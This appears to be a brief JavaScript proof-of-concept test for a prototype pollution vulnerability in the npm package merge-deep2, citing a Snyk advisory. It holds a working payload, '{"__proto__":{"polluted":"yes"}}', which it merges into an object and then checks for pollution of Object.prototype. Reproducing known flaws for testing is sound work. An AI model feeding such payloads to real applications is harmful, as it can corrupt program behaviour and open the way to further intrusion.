// //https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
// test("prototype pollution in merge-deep2", () => {
  const mergeDeep2 = require("merge-deep2");
  let obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

console.log({}.polluted);

  mergeDeep2({}, JSON.parse(malicious_payload), true);
console.log({}.polluted);
// });
